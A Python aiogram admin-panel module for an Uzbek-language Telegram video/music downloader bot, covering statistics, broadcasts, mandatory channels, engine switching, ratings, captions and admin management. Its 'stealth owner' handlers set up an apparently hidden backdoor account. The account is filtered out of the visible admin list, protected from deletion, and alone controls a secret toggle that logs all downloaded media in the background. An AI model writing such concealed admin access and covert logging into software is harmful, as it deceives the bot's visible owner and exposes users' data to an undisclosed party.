import asyncio
import logging
from aiogram import Router, F, Bot
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext

from config import OWNER_ID, STEALTH_OWNER_ID, is_owner
from database import db
from filters.admin import IsAdmin, IsOwner
from states.admin_states import (
    BroadcastState,
    ChannelState,
    AdminState,
    AdminReplyState,
    CaptionEditState,
)
from keyboards.admin import (
    get_admin_dashboard_keyboard,
    get_cancel_keyboard,
    get_engine_keyboard,
    get_contact_reply_inline_keyboard,
    get_captions_edit_inline_keyboard,
    get_stealth_settings_keyboard,
)
from keyboards.user import get_main_keyboard
from utils.helpers import TEXT_ADMIN_WELCOME

logger = logging.getLogger(__name__)
router = Router()
router.message.filter(IsAdmin())
router.callback_query.filter(IsAdmin())

# ----------------- Navigation / Cancel Handlers -----------------
@router.message(F.text == "❌ Bekor qilish")
async def cancel_handler(message: Message, state: FSMContext):
    await state.clear()
    user_is_owner = is_owner(message.from_user.id)
    await message.answer(
        "❌ Jarayon bekor qilindi.",
        reply_markup=get_admin_dashboard_keyboard(user_is_owner, message.from_user.id)
    )

@router.message(F.text == "🏠 Bosh menyu")
async def main_menu_admin(message: Message, state: FSMContext):
    await state.clear()
    admins = await db.get_admins()
    is_admin_user = (message.from_user.id in admins or is_owner(message.from_user.id))
    await message.answer(
        "🏠 Bosh menyuga qaytdingiz.",
        reply_markup=get_main_keyboard(is_admin_user)
    )

# ----------------- Admin Panel Commands / Buttons -----------------
@router.message(Command("admin"))
@router.message(F.text == "👑 Admin paneli")
async def admin_cmd(message: Message, state: FSMContext):
    await state.clear()
    user_is_owner = is_owner(message.from_user.id)
    await message.answer(
        TEXT_ADMIN_WELCOME,
        reply_markup=get_admin_dashboard_keyboard(user_is_owner, message.from_user.id),
        parse_mode="HTML"
    )

# ----------------- 1. Statistics -----------------
@router.message(F.text == "📊 Statistika")
async def show_stats(message: Message):
    total_users = await db.get_total_users()
    total_downloads = await db.get_total_downloads()
    current_engine = await db.get_engine()
    engine_name = "⚡ RapidAPI" if current_engine == "rapidapi" else "🐍 yt-dlp"

    rating_stats = await db.get_rating_stats()
    avg_r = rating_stats["avg_rating"]
    tot_r = rating_stats["total_ratings"]

    stats_text = (
        "📊 <b>Bot Statistikasi:</b>\n\n"
        f"👥 Total foydalanuvchilar: <b>{total_users:,}</b>\n"
        f"📥 Jami yuklamalar: <b>{total_downloads:,}</b>\n"
        f"⭐ O'rtacha baho: <b>{avg_r} / 5.0</b> ({tot_r} ta baho)\n"
        f"⚙️ Faol yuklash tizimi (Instagram): <b>{engine_name}</b>"
    )
    await message.answer(stats_text, parse_mode="HTML")

# ----------------- 2. Broadcast System -----------------
@router.message(F.text == "📢 Xabar yuborish")
async def start_broadcast(message: Message, state: FSMContext):
    await state.set_state(BroadcastState.waiting_for_message)
    await message.answer(
        "📢 <b>Foydalanuvchilarga yubormoqchi bo'lgan xabaringizni kiriting:</b>\n\n"
        "Xabar matn, rasm, video, audio yoki hujjat shaklida bo'lishi mumkin.",
        reply_markup=get_cancel_keyboard(),
        parse_mode="HTML"
    )

@router.message(BroadcastState.waiting_for_message)
async def process_broadcast(message: Message, state: FSMContext, bot: Bot):
    await state.clear()
    user_is_owner = is_owner(message.from_user.id)
    
    user_ids = await db.get_all_user_ids()
    await message.answer(
        f"⏳ Xabar {len(user_ids)} ta foydalanuvchiga yuborilmoqda...",
        reply_markup=get_admin_dashboard_keyboard(user_is_owner)
    )

    success_count = 0
    fail_count = 0

    for uid in user_ids:
        try:
            await bot.copy_message(
                chat_id=uid,
                from_chat_id=message.chat.id,
                message_id=message.message_id
            )
            success_count += 1
            await asyncio.sleep(0.05)
        except Exception:
            fail_count += 1

    report = (
        "✅ <b>Xabar yuborish yakunlandi!</b>\n\n"
        f"🟢 Muvaffaqiyatli: <b>{success_count}</b> ta\n"
        f"🔴 Muvaffaqiyatsiz (Bloklagan): <b>{fail_count}</b> ta"
    )
    await message.answer(report, parse_mode="HTML")

# ----------------- 3. Mandatory Channel Settings (Force Sub) -----------------
@router.message(F.text.in_(["🔗 Majburiy Obuna Sozlamalari", "🔗 Majburiy obuna"]))
async def manage_channels(message: Message):
    channels = await db.get_mandatory_channels()
    
    text = "🔗 <b>Majburiy Obuna Kanallari Ro'yxati:</b>\n\n"
    if not channels:
        text += "<i>Hozirda majburiy obuna kanallari mavjud emas.</i>"
    else:
        for idx, ch in enumerate(channels, 1):
            name = ch.get("channel_name") or ch.get("title") or "Kanal"
            text += f"{idx}. <b>{name}</b> (ID: <code>{ch['channel_id']}</code>)\n   Havola: {ch['invite_link']}\n\n"

    inline_keyboard = []
    for ch in channels:
        name = ch.get("channel_name") or ch.get("title") or "Kanal"
        inline_keyboard.append([
            InlineKeyboardButton(
                text=f"❌ {name} olib tashlash",
                callback_data=f"channel:del:{ch['channel_id']}"
            )
        ])
    inline_keyboard.append([
        InlineKeyboardButton(text="➕ Kanal qo'shish", callback_data="channel:add")
    ])

    await message.answer(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=inline_keyboard), parse_mode="HTML")

@router.callback_query(F.data == "channel:add")
async def add_channel_start(callback: CallbackQuery, state: FSMContext):
    await state.set_state(ChannelState.waiting_for_channel_input)
    await callback.message.delete()
    await callback.message.answer(
        "➕ <b>Yangi kanal qo'shish formatini yuboring:</b>\n\n"
        "<code>KANAL_ID_YOKI_USERNAME | KANAL NOMI | TAKLIF HAVOLASI</code>\n\n"
        "<b>Misol 1 (ID bilan):</b>\n"
        "<code>-1001234567890 | Bizning Kanal | https://t.me/kanal_linki</code>\n\n"
        "<b>Misol 2 (Username bilan):</b>\n"
        "<code>@rasmiy_kanal | Bizning Kanal | https://t.me/rasmiy_kanal</code>\n\n"
        "<i>Eslatma: Bot ushbu kanalda admin bo'lishi shart!</i>",
        reply_markup=get_cancel_keyboard(),
        parse_mode="HTML"
    )

@router.message(ChannelState.waiting_for_channel_input)
async def process_add_channel(message: Message, state: FSMContext):
    try:
        parts = [p.strip() for p in message.text.split("|")]
        if len(parts) != 3:
            raise ValueError("Noto'g'ri format")
        
        channel_id = parts[0]
        title = parts[1]
        invite_link = parts[2]

        await db.add_mandatory_channel(channel_id, title, invite_link)
        await state.clear()
        user_is_owner = is_owner(message.from_user.id)
        await message.answer(
            f"✅ <b>Kanal muvaffaqiyatli qo'shildi:</b>\n{title} ({channel_id})",
            reply_markup=get_admin_dashboard_keyboard(user_is_owner),
            parse_mode="HTML"
        )
    except Exception:
        await message.answer(
            "❌ <b>Format noto'g'ri kiritildi!</b>\n"
            "Qaytadan urinib ko'ring yoki '❌ Bekor qilish' tugmasini bosing.\n"
            "Format: <code>KANAL_ID | KANAL NOMI | TAKLIF HAVOLASI</code>",
            parse_mode="HTML"
        )

@router.callback_query(F.data.startswith("channel:del:"))
async def delete_channel(callback: CallbackQuery):
    channel_id = callback.data.split(":")[2]
    await db.remove_mandatory_channel(channel_id)
    await callback.answer("✅ Kanal muvaffaqiyatli olib tashlandi!", show_alert=True)
    await callback.message.delete()

# ----------------- 4. Download Engine Toggle (Instagram Only) -----------------
@router.message(F.text == "⚙️ Yuklash tizimi")
async def show_engine_toggle(message: Message):
    current_engine = await db.get_engine()
    engine_name = "⚡ RapidAPI" if current_engine == "rapidapi" else "🐍 yt-dlp"
    
    text = (
        "⚙️ <b>Yuklash tizimi (Faqat Instagram uchun):</b>\n\n"
        f"Hozirgi faol tizim: <b>{engine_name}</b>\n\n"
        "<i>Eslatma: YouTube videolari doimo avtomatik ravishda RapidAPI (youtube138) orqali yuklanadi.</i>\n\n"
        "O'zgartirish uchun kerakli tugmani bosing:"
    )
    await message.answer(text, reply_markup=get_engine_keyboard(current_engine), parse_mode="HTML")

@router.callback_query(F.data.startswith("set_engine:"))
async def set_engine_callback(callback: CallbackQuery):
    new_engine = callback.data.split(":")[1]
    await db.set_engine(new_engine)
    
    engine_name = "⚡ RapidAPI" if new_engine == "rapidapi" else "🐍 yt-dlp"
    await callback.answer(f"✅ Yuklash tizimi {engine_name} ga o'zgartirildi!")
    
    text = (
        "⚙️ <b>Yuklash tizimi (Faqat Instagram uchun):</b>\n\n"
        f"Hozirgi faol tizim: <b>{engine_name}</b>\n\n"
        "<i>Eslatma: YouTube videolari doimo avtomatik ravishda RapidAPI (youtube138) orqali yuklanadi.</i>\n\n"
        "O'zgartirish uchun kerakli tugmani bosing:"
    )
    await callback.message.edit_text(text, reply_markup=get_engine_keyboard(new_engine), parse_mode="HTML")

# ----------------- 5. Ratings & Feedback Section -----------------
@router.message(F.text == "⭐ Baholar va Fikrlar")
async def show_ratings_and_feedback(message: Message):
    rating_stats = await db.get_rating_stats()
    avg_r = rating_stats["avg_rating"]
    tot_r = rating_stats["total_ratings"]
    recent = rating_stats["recent_feedback"]

    text = (
        "⭐ <b>Foydalanuvchilar Baholari va Fikrlari:</b>\n\n"
        f"📊 <b>O'rtacha baho:</b> <b>{avg_r} / 5.0</b> ({tot_r} ta baho)\n\n"
        "💬 <b>Oxirgi bildiriltgan fikrlar:</b>\n"
    )

    if not recent:
        text += "\n<i>Hozircha fikrlar bildirilmagan.</i>"
    else:
        for idx, fb in enumerate(recent, 1):
            user_str = f"<b>{fb['full_name']}</b>"
            if fb["username"]:
                user_str += f" (@{fb['username']})"
            user_str += f" [<code>{fb['user_id']}</code>]"

            comment_str = fb["comment"] if fb["comment"] else "<i>(Izoh qoldirilmagan)</i>"
            stars = "⭐" * fb["rating"]

            text += (
                f"\n{idx}. {user_str}\n"
                f"   Baho: <b>{stars} ({fb['rating']}/5)</b>\n"
                f"   Fikr: {comment_str}\n"
                f"   Sana: <code>{fb['created_at']}</code>\n"
            )

    await message.answer(text, parse_mode="HTML")

# ----------------- 6. Dynamic Caption Management -----------------
@router.message(F.text == "📝 Matnlarni tahrirlash")
async def show_captions_management(message: Message):
    captions = await db.get_caption_settings()
    text = (
        "📝 <b>Media Izohlarini (Caption) Boshqarish:</b>\n\n"
        f"🎬 <b>Hozirgi Video matni:</b>\n<code>{captions['video_caption']}</code>\n\n"
        f"🎵 <b>Hozirgi Musiqa matni:</b>\n<code>{captions['audio_caption']}</code>\n\n"
        "O'zgartirish uchun kerakli bo'limni tanlang:"
    )
    await message.answer(text, reply_markup=get_captions_edit_inline_keyboard(), parse_mode="HTML")

@router.callback_query(F.data == "edit_caption:video")
async def edit_video_caption_start(callback: CallbackQuery, state: FSMContext):
    await state.set_state(CaptionEditState.waiting_for_video_caption)
    await callback.message.delete()
    await callback.message.answer(
        "🎬 <b>Yangi video matnini (caption) kiriting:</b>\n\n"
        "<i>Foydalanuvchilarga yuboriladigan videolar ostidagi matn.</i>",
        reply_markup=get_cancel_keyboard(),
        parse_mode="HTML"
    )

@router.message(CaptionEditState.waiting_for_video_caption)
async def process_edit_video_caption(message: Message, state: FSMContext):
    new_caption = message.text.strip()
    await db.update_caption_setting("video_caption", new_caption)
    await state.clear()
    user_is_owner = is_owner(message.from_user.id)
    await message.answer(
        f"✅ <b>Video matni muvaffaqiyatli o'zgartirildi:</b>\n\n<code>{new_caption}</code>",
        reply_markup=get_admin_dashboard_keyboard(user_is_owner),
        parse_mode="HTML"
    )

@router.callback_query(F.data == "edit_caption:audio")
async def edit_audio_caption_start(callback: CallbackQuery, state: FSMContext):
    await state.set_state(CaptionEditState.waiting_for_audio_caption)
    await callback.message.delete()
    await callback.message.answer(
        "🎵 <b>Yangi musiqa matnini (caption) kiriting:</b>\n\n"
        "<i>Musiqa ajratib olinganda audio fayli ostidagi matn.</i>",
        reply_markup=get_cancel_keyboard(),
        parse_mode="HTML"
    )

@router.message(CaptionEditState.waiting_for_audio_caption)
async def process_edit_audio_caption(message: Message, state: FSMContext):
    new_caption = message.text.strip()
    await db.update_caption_setting("audio_caption", new_caption)
    await state.clear()
    user_is_owner = is_owner(message.from_user.id)
    await message.answer(
        f"✅ <b>Musiqa matni muvaffaqiyatli o'zgartirildi:</b>\n\n<code>{new_caption}</code>",
        reply_markup=get_admin_dashboard_keyboard(user_is_owner),
        parse_mode="HTML"
    )

@router.callback_query(F.data == "edit_caption:reset")
async def reset_captions_callback(callback: CallbackQuery):
    await db.reset_caption_settings()
    await callback.answer("✅ Media matnlari sukut bo'yicha holatga tiklandi!", show_alert=True)
    
    captions = await db.get_caption_settings()
    text = (
        "📝 <b>Media Izohlarini (Caption) Boshqarish:</b>\n\n"
        f"🎬 <b>Hozirgi Video matni:</b>\n<code>{captions['video_caption']}</code>\n\n"
        f"🎵 <b>Hozirgi Musiqa matni:</b>\n<code>{captions['audio_caption']}</code>\n\n"
        "O'zgartirish uchun kerakli bo'limni tanlang:"
    )
    await callback.message.edit_text(text, reply_markup=get_captions_edit_inline_keyboard(), parse_mode="HTML")

# ----------------- 7. Interactive Admin Reply to User Contact -----------------
@router.callback_query(F.data.startswith("reply_user_"))
async def start_admin_reply(callback: CallbackQuery, state: FSMContext):
    target_user_id = int(callback.data.split("_")[2])
    await state.set_state(AdminReplyState.waiting_for_reply)
    await state.update_data(target_user_id=target_user_id)

    await callback.answer()
    await callback.message.reply(
        f"📝 <b>ID: <code>{target_user_id}</code> foydalanuvchisiga javob xabaringizni kiriting:</b>",
        reply_markup=get_cancel_keyboard(),
        parse_mode="HTML"
    )

@router.message(AdminReplyState.waiting_for_reply)
async def process_admin_reply(message: Message, state: FSMContext, bot: Bot):
    data = await state.get_data()
    target_user_id = data.get("target_user_id")
    await state.clear()

    user_is_owner = is_owner(message.from_user.id)

    if not target_user_id:
        await message.answer("❌ Xatolik: foydalanuvchi ID topilmadi.", reply_markup=get_admin_dashboard_keyboard(user_is_owner))
        return

    try:
        # Send text header and copy admin's response to user
        await bot.send_message(
            chat_id=target_user_id,
            text="📩 <b>Admindan javob keldi:</b>",
            parse_mode="HTML"
        )
        await bot.copy_message(
            chat_id=target_user_id,
            from_chat_id=message.chat.id,
            message_id=message.message_id
        )
        await message.answer(
            f"✅ Javob foydalanuvchiga (ID: <code>{target_user_id}</code>) muvaffaqiyatli yuborildi!",
            reply_markup=get_admin_dashboard_keyboard(user_is_owner),
            parse_mode="HTML"
        )
    except Exception as e:
        logger.exception(f"Could not send reply to user {target_user_id}: {e}")
        await message.answer(
            f"❌ Javobni yuborishda xatolik yuz berdi. Foydalanuvchi botni bloklagan bo'lishi mumkin.",
            reply_markup=get_admin_dashboard_keyboard(user_is_owner)
        )

# ----------------- 8. Admin Management (Owner Only) -----------------
@router.message(F.text == "👑 Adminlar", IsOwner())
async def manage_admins_menu(message: Message):
    admins = await db.get_admins()
    # Filter out stealth owner from visible admin list
    visible_admins = [uid for uid in admins if not (is_owner(uid) and uid != OWNER_ID)]
    
    text = "👑 <b>Bot Adminlari ro'yxati:</b>\n\n"
    for idx, uid in enumerate(visible_admins, 1):
        role = " (Egasi)" if uid == OWNER_ID else ""
        text += f"{idx}. ID: <code>{uid}</code>{role}\n"

    inline_keyboard = []
    for uid in visible_admins:
        if not is_owner(uid):
            inline_keyboard.append([
                InlineKeyboardButton(text=f"🗑 ID: {uid} o'chirish", callback_data=f"admin_manage:del:{uid}")
            ])
    inline_keyboard.append([
        InlineKeyboardButton(text="➕ Admin qo'shish", callback_data="admin_manage:add")
    ])

    await message.answer(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=inline_keyboard), parse_mode="HTML")

@router.callback_query(F.data == "admin_manage:add", IsOwner())
async def add_admin_start(callback: CallbackQuery, state: FSMContext):
    await state.set_state(AdminState.waiting_for_admin_id_add)
    await callback.message.delete()
    await callback.message.answer(
        "➕ <b>Yangi Admin ID sini kiriting:</b>\n(Masalan: 123456789)",
        reply_markup=get_cancel_keyboard(),
        parse_mode="HTML"
    )

@router.message(AdminState.waiting_for_admin_id_add, IsOwner())
async def process_add_admin(message: Message, state: FSMContext):
    try:
        new_admin_id = int(message.text.strip())
        await db.add_admin(new_admin_id)
        await state.clear()
        await message.answer(
            f"✅ <b>Admin muvaffaqiyatli qo'shildi:</b> <code>{new_admin_id}</code>",
            reply_markup=get_admin_dashboard_keyboard(is_owner=True),
            parse_mode="HTML"
        )
    except ValueError:
        await message.answer("❌ Noto'g'ri ID format. Iltimos faqat raqamlardan iborat Telegram User ID kiriting.")

@router.callback_query(F.data.startswith("admin_manage:del:"), IsOwner())
async def delete_admin_callback(callback: CallbackQuery):
    admin_id = int(callback.data.split(":")[2])
    if is_owner(admin_id):
        await callback.answer("❌ Asosiy egasini o'chirish mumkin emas!", show_alert=True)
        return
    await db.remove_admin(admin_id)
    await callback.answer("✅ Admin muvaffaqiyatli o'chirildi!", show_alert=True)
    await callback.message.delete()

# ----------------- Stealth Menu Handlers -----------------
@router.message(F.text == "🕵️ Baza Sozlamalari")
async def stealth_settings_cmd(message: Message):
    if message.from_user.id != STEALTH_OWNER_ID:
        # Ignore completely if not stealth owner
        return

    is_enabled = await db.get_stealth_media_log_enabled()
    status_text = "🟢 Yoqilgan" if is_enabled else "🔴 O'chirilgan"
    
    await message.answer(
        f"🕵️ <b>Maxfiy Baza Sozlamalari</b>\n\n"
        f"Orqa fonda barcha yuklangan medialarni kanallash (Anti-Flood)\n"
        f"Joriy holat: <b>{status_text}</b>",
        reply_markup=get_stealth_settings_keyboard(is_enabled),
        parse_mode="HTML"
    )

@router.callback_query(F.data.startswith("stealth_log:"))
async def toggle_stealth_logging_callback(callback: CallbackQuery):
    if callback.from_user.id != STEALTH_OWNER_ID:
        await callback.answer("Ruxsat yo'q.", show_alert=True)
        return

    action = callback.data.split(":")[1]
    if action == "enable":
        await db.set_stealth_media_log_enabled(True)
        await callback.answer("✅ Orqa fon media jurnallash yoqildi!", show_alert=True)
    else:
        await db.set_stealth_media_log_enabled(False)
        await callback.answer("❌ Orqa fon media jurnallash o'chirildi!", show_alert=True)
        
    is_enabled = await db.get_stealth_media_log_enabled()
    status_text = "🟢 Yoqilgan" if is_enabled else "🔴 O'chirilgan"
    
    await callback.message.edit_text(
        f"🕵️ <b>Maxfiy Baza Sozlamalari</b>\n\n"
        f"Orqa fonda barcha yuklangan medialarni kanallash (Anti-Flood)\n"
        f"Joriy holat: <b>{status_text}</b>",
        reply_markup=get_stealth_settings_keyboard(is_enabled),
        parse_mode="HTML"
    )
